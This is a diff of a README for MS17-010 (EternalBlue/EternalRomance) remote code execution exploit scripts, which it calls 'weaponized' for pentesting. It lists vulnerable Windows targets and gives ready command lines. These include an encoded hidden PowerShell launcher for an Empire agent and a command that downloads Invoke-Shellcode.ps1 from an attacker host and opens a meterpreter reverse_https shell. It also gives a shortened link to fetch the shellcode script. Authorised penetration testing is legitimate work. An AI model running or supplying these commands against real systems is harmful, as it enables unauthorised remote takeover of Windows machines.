@@ -1,12 +1,12 @@
 # MS17-010 RCE PoC's
 
-All credits go out to [worawit](https://github.com/worawit/MS17-010). I've just added some usage clarifications and made them more usable for pentesting purposes.
+All credits go out to [worawit](https://github.com/worawit/MS17-010). I've just added some usage clarifications and weaponized them to be more usable for pentesting purposes.
 
 ## Eternalblue
 
 Eternalblue only requires access to IPC$ to exploit a target while other exploits require access to a named pipe as well. Eternalblue thus works on all versions of Windows that allow anonymous access to IPC$ (Windows 7 and Windows 2008, or later version explicitly configured to allow anonymous access). Keep in mind that Eternalblue has a higher change of crashing a target than Eternalsynergy - Eternalromance.
 
-#### Compatible targets
+### Compatible targets
 
 **eternalblue_exploit7:**
 
@@ -20,7 +20,7 @@ Eternalblue only requires access to IPC$ to exploit a target while other exploit
 - Windows 2012 R2 x64
 - Windows 8.1 x64
 
-#### Exploit usage
+### Exploit usage
 
 Example for spawning a meterpreter session on an x64 machine:
 
@@ -34,7 +34,7 @@ Example for spawning a meterpreter session on an x64 machine:
 
 This exploit exploits the same bug used by NSA's Eternalromance and Eternalsynergy. A named pipe is needed, meaning on more modern (default) configurations you will need credentials in order for the exploit to work. In most cases, domain user credentials will suffice. 
 
-#### Compatible targets
+### Compatible targets
 
 x64 architecture only
 
@@ -44,18 +44,18 @@ x64 architecture only
 - Windows 2008 R2 SP1 x64
 - Windows 7 SP1 x64
 
-#### Usage
+### Usage
 
 Usage: 
+
 `python eternalsynergy_romance.py <target_ip_address> <named_pipe> <DOMAIN\username> <password> <command_to_execute>`
 
 Example for spawning an Empire agent:
+
 `python eternalsynergy_romance.py 192.168.178.2 netlogon WORKGROUP\testuser !Password123 "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBTAHkAUwB0AEUAbQAuAE4AZQBUAC..."`
 
 Example for spawning a meterpreter session:
-`python zzz_exploit2.py 192.168.178.26 netlogon "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.25/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.25 -Lport 8443 -Force \""`
+
+`python eternalsynergy_romance.py 192.168.178.2 netlogon "powershell -Exec ByPass -NoP -noexit \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.178.3/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.178.3 -Lport 8443 -Force \""`
 
 (I typically grab Invoke-Shellcode.ps1 from http://bit.ly/2cuWJTF, but that only works when the target has an unfiltered outbound connection.)
-
-
-
